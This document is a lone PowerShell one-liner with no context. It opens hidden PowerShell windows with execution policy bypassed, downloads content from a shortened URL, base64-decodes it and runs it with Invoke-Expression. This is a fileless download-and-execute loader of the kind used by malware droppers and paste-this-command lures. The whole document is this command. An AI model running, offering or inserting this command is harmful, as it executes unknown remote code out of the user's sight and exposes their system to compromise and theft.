powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& {Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \"iex ( [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((irm https://tinyurl.com/4m6sec8p)))) \"' }"
